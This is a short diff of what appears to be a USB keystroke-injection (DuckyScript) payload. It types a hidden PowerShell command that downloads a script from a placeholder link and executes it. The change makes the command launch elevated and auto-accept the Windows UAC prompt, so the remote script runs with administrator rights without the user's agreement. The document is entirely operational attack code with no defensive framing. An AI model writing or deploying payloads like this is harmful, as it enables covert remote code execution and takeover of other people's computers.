@@ -4,4 +4,7 @@ DELAY 300
 REM Put Your PowerShell Scripts Link Here
 STRING powershell -w h iex (irm link)
 DELAY 200
-ENTER
+CTRL-SHIFT-ENTER
+DELAY 3000
+ALT y
+DELAY 100
